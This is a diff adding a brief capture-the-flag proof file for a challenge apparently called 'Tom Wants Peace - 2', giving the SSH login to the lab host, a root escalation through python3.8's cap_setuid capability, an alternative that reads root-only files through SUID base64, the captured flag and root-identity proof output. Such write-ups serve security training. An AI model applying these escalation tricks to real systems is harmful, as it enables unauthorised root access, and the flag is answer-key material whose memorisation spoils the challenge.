@@ -1,0 +1,15 @@
+Tom Wants Peace - 2 — Flag & Proof
+====================================
+
+Endpoint : nc 0.cloud.chals.io 26740  (OpenSSH 8.2p1 Ubuntu)
+Auth     : ssh -i id_rsa Ross@0.cloud.chals.io -p 26740
+Privesc  : /usr/bin/python3.8 has cap_setuid+ep  ->  os.setuid(0)
+Alt      : SUID /usr/bin/base64 can read root-only files
+
+Root flag: KPMG_CTF{PcLZb4V8hwQrhtX-HVtCZpGh9gVxWBP-orJVHOorFNlB}
+
+[proof] whoami as root:
+uid=0(root) gid=1000(Ross) groups=1000(Ross)
+
+[proof] base64 SUID dump of /root/.final/root.txt (decoded):
+KPMG_CTF{PcLZb4V8hwQrhtX-HVtCZpGh9gVxWBP-orJVHOorFNlB}
